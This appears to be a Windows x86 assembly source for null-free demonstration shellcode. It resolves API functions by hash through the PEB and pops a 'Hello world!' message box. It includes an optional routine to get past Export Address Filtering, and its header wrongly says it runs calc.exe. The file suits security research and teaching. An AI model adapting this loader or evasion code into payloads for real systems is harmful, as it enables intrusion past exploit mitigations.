; Copyright (c) 2009-2010, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
; Project homepage: http://code.google.com/p/w32-dl-loadlib-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.
BITS 32
; Windows x86 null-free shellcode that executes calc.exe.
; Works in any application for Windows 5.0-7.0 all service packs.
; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).
; This version uses 16-bit hashes.

%include 'w32-msgbox-shellcode-hash-list.asm'

%define B2W(b1,b2)                      (((b2) << 8) + (b1))
%define W2DW(w1,w2)                     (((w2) << 16) + (w1))
%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))

%ifdef STACK_ALIGN
    AND     SP, 0xFFFC
%endif
find_hash: ; Find ntdll's InInitOrder list of modules:
    XOR     ESI, ESI                    ; ESI = 0
%ifndef DEFEAT_EAF
    PUSH    ESI                         ; Stack = 0
%endif
    MOV     ESI, [FS:ESI + 0x30]        ; ESI = &(PEB) ([FS:0x30])
    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr
    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)

%ifdef DEFEAT_EAF
  ; The first loaded module is ntdll on x86 systems and ntdll32 on x64 systems. Both modules have this code:
  ; ntdll32!RtlGetCurrentPeb (<no parameter info>)
  ;     64a118000000    mov     eax,dword ptr fs:[00000018h]
  ;     8b4030          mov     eax,dword ptr [eax+30h]
  ;     c3              ret
  %define MEMORY_READER_OFFSET 0x30
      MOV     EDX, [ESI + 0x08]           ; EDX = InInitOrder[X].base_address == module
      MOVZX   EBP, WORD [EDX + 0x3C]      ; EBX = module->pe_header_offset
      ADD     EDX, [EDX + EBP + 0x2C]     ; EDX = module + module.pe_header->code_offset == module code
      MOV     DH, 0xF                     ; The EAF breakpoints are in tables that are at the start of ntdll,
                                          ; so we can avoid them easily...
  scan_for_memory_reader:
      INC     EDX
      CMP     DWORD [EDX], 0xC330408B     ; EDX => MOV EAX, [EAX+30], RET ?
      JNE     scan_for_memory_reader
      PUSH    EDX                         ; Save &(MOV EAX, [EAX+30], RET)
%endif

next_module: ; Get the baseaddress of the current module and find the next module:
    MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address
    MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink == InInitOrder[X+1]
get_proc_address_loop: ; Find the PE header and export and names tables of the module:
    MOV     EBX, [EBP + 0x3C]           ; EBX = &(PE header)
    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)
    ADD     EBX, EBP                    ; EBX = &(export table)
    MOV     ECX, [EBX + 0x18]           ; ECX = number of name pointers
    JCXZ    next_module                 ; No name pointers? Next module.
next_function_loop: ; Get the next function name for hashing:
    MOV     EDI, [EBX + 0x20]           ; EDI = offset(names table)
    ADD     EDI, EBP                    ; EDI = &(names table)
    MOV     EDI, [EDI + ECX * 4 - 4]    ; EDI = offset(function name)
    ADD     EDI, EBP                    ; EDI = &(function name)
    XOR     EAX, EAX                    ; EAX = 0
    CDQ                                 ; EDX = 0
hash_loop: ; Hash the function name and compare with requested hash
    XOR     DL, [EDI]
    ROR     DX, BYTE hash_ror_value
    SCASB
    JNE     hash_loop
    CMP     DX, hash_user32_MessageBoxA
    JE      found_MessageBoxA           ;
    CMP     DX, hash_kernel32_LoadLibraryA
    LOOPNE  next_function_loop          ; Not the right hash and functions left in module? Next function
    JNE     next_module                 ; Not the right hash and no functions left in module? Next module
found_MessageBoxA:
    ; Found the right hash: get the address of the function:
    MOV     EDX, [EBX + 0x24]           ; EDX = offset ordinals table
    ADD     EDX, EBP                    ; EDX = &oridinals table
    MOVZX   EDX, WORD [EDX + 2 * ECX]   ; EDX = ordinal number of function
%ifdef DEFEAT_EAF
    XCHG    EAX, EDI                    ; EDI = 0
    LEA     EAX, [EBX + 0x1C - MEMORY_READER_OFFSET]     ; EAX = &offset address table - MEMORY_READER_OFFSET
    POP     ECX                         ; ECX = &(ntdll:MOV EAX, [EAX+30], RET) 
    CALL    ECX                         ; EAX = [EAX + 0x30] == [&offset address table] == offset address table
    XCHG    EAX, EDI                    ; EDI = offset address table, EAX = 0
    PUSH    EAX                         ; Stack = 0
%else
    MOV     EDI, [EBX + 0x1C]           ; EDI = offset address table
%endif
    ADD     EDI, EBP                    ; EDI = &address table
    ADD     EBP, [EDI + 4 * EDX]        ; EBP = &(function)
    TEST    ESI, ESI
    JZ      message_box

load_library:                           ; Stack = 0 (two ways of setting it, depding on DEFEAT_EAF)
    PUSH    B2DW('3', '2', ' ', ' ')    ; Stack = "32  ", 0
    PUSH    B2DW('u', 's', 'e', 'r')    ; Stack = "user32  ", 0
    PUSH    ESP                         ; Stack = &("user32"), "user32  ", 0
%ifdef DEFEAT_EAF
    ; We will need to put a copy of &(ntdll:MOV EAX, [EAX+30], RET) back on the stack for the next function:
    XCHG    ECX, [ESP]                  ; Stack = &(ntdll:MOV EAX, [EAX+30], RET), ECX = &("user32  ")
    PUSH    ECX                         ; Stack = &("user32  "), &(ntdll:MOV EAX, [EAX+30], RET), "user32  ", 0
%endif
    CALL    EBP                         ; LoadLibraryA(&("user32  "));
    XCHG    EAX, EBP                    ; EBP = &(user32.dll)
    XOR     ESI, ESI                    ; ESI = 0
    JMP     get_proc_address_loop

message_box:
    ; create the "Hello world!" string
%ifndef DEFEAT_EAF
    PUSH    ESI                         ; Stack = 0
%endif
    PUSH    B2DW('r', 'l', 'd', '!')    ; Stack = "rld!", 0
    PUSH    B2DW('o', ' ', 'w', 'o')    ; Stack = "o world!", 0
    PUSH    B2DW('H', 'e', 'l', 'l')    ; Stack = "Hello world!", 0
    PUSH    ESP                         ; Stack = &("Hello world!"), "Hello world!", 0
    XCHG    EAX, [ESP]                  ; Stack = 0, "Hello world!", 0
    PUSH    EAX                         ; Stack = &("Hello world!"), 0, "Hello world!", 0
    PUSH    EAX                         ; Stack = &("Hello world!"), &("Hello world!"), 0, "Hello world!", 0
    PUSH    ESI                         ; Stack = 0, &("Hello world!"), &("Hello world!"), 0, "Hello world!", 0
    CALL    EBP                         ; MessageBoxA(NULL, &("Hello world!"), &("Hello world!"), MB_OK);
    INT3                                ; Crash
